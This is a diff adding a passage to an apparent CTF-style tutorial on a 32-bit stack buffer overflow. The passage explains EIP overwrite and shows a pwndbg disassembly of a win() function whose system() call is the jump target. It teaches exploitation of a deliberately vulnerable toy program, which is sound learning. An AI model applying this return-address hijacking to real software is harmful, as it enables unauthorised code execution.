@@ -71,3 +71,41 @@ A useful tool for looking into this sort of stuff is a debugger, `gdb` is my deb
 ![image](https://user-images.githubusercontent.com/104875856/185719252-4af49605-8c4a-4f13-8855-8ecb98c5a8ac.png)
 
 Okay, it's about to get a bit technical. This output shows that values on the stack are being overwritten by our input. If you're not familiar with the stack at all there's plenty of resources explain how the stack works, for now I'll just be explaining how we can abuse this overflow.
+
+Now, this explain why we get our segfault, we're overwriting the value in the EIP register. The EIP register is supposed to point to the next instruction we want to execute, instead its pointing to `0x41414141` (`0x41` == 'A'). But this is good, this means we can control where our program goes if we put a valid address in EIP.
+
+We wanna get to the `system()` call inside the `win()` function, so lets find the address for that instruction. We can do this in `gdb` by disassembling the `win()` function, showing all the addresses and offsets for the assembly instructions.
+
+```
+pwndbg> disassemble win
+Dump of assembler code for function win:
+   0x08049196 <+0>:     push   ebp
+   0x08049197 <+1>:     mov    ebp,esp
+   0x08049199 <+3>:     push   ebx
+   0x0804919a <+4>:     sub    esp,0x4
+   0x0804919d <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
+   0x080491a2 <+12>:    add    ebx,0x2e52
+   0x080491a8 <+18>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x080491af <+25>:    jne    0x80491e8 <win+82>
+   0x080491b1 <+27>:    cmp    DWORD PTR [ebp+0xc],0x1337c0de
+   0x080491b8 <+34>:    jne    0x80491e8 <win+82>
+   0x080491ba <+36>:    sub    esp,0xc
+   0x080491bd <+39>:    lea    eax,[ebx-0x1fec]
+   0x080491c3 <+45>:    push   eax
+   0x080491c4 <+46>:    call   0x8049040 <puts@plt>
+   0x080491c9 <+51>:    add    esp,0x10
+   0x080491cc <+54>:    sub    esp,0xc
+   0x080491cf <+57>:    lea    eax,[ebx-0x1faf]
+   0x080491d5 <+63>:    push   eax
+   0x080491d6 <+64>:    call   0x8049050 <system@plt>
+   0x080491db <+69>:    add    esp,0x10
+   0x080491de <+72>:    sub    esp,0xc
+   0x080491e1 <+75>:    push   0x0
+   0x080491e3 <+77>:    call   0x8049060 <exit@plt>
+   0x080491e8 <+82>:    nop
+   0x080491e9 <+83>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x080491ec <+86>:    leave
+   0x080491ed <+87>:    ret
+End of assembler dump.
+pwndbg>
+```
